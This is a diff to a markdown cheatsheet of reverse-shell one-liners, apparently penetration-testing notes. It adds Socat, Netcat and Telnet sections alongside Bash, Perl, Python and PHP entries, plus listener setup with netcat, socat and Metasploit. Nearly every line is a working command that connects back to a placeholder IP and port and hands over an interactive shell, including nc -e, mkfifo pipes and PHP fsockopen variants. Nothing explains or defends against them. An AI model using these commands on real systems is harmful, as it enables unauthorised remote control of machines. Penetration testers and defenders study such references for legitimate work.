@@ -1,15 +1,23 @@
 # Cheatsheet for Reverse-shell one-liner
 
 ## Table of contents
-1. [Bash](#bash)
-2. [Perl](#perl)
-3. [Python](#python)
-4. [PHP](#php)
+* [Socat](#socat)
+* [Bash](#bash)
+* [Perl](#perl)
+* [Python](#python)
+* [PHP](#php)
+* [Netcat](#netcat)
+* [Telnet](#telnet)
 
 ## Spawn a handler
 ### Netcat
 ```bash
 nc -lvp <PORT>
+```
+
+### Socat
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
 ```
 
 ### Metasploit
@@ -29,7 +37,7 @@ msf5 > exploit
 ```
 
 ## Reverse-shell one-liner
-### Socat
+### Socat <a name="socat"></a>
 Full interactive shell !!!
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
@@ -60,12 +68,17 @@ Version indépendante de « /bin/sh » pour Linux (avec fork) :
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
-### Python
+### Python <a name="python"></a>
+Full Python :
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+Python with system call to bash :
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-### PHP
+### PHP <a name="php"></a>
 ```bash
 php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
@@ -80,4 +93,26 @@ php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ```bash
 php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+```
+
+### Netcat <a name="netcat"></a>
+```bash
+nc -e /bin/sh <IP> <PORT>
+```
+```bash
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <IP> <PORT> > f
+```
+```bash
+rm -f x; mknod x p && nc <IP> <PORT> 0<x | /bin/bash 1>x
+```
+
+### Telnet <a name="telnet"></a>
+```bash
+telnet <IP> <PORT1> | /bin/bash | telnet <IP> <PORT2>
+```
+```bash
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <IP> <PORT> > f
+```
+```bash
+rm -f x; mknod x p && telnet <IP> <PORT> 0<x | /bin/bash 1>x
 ```
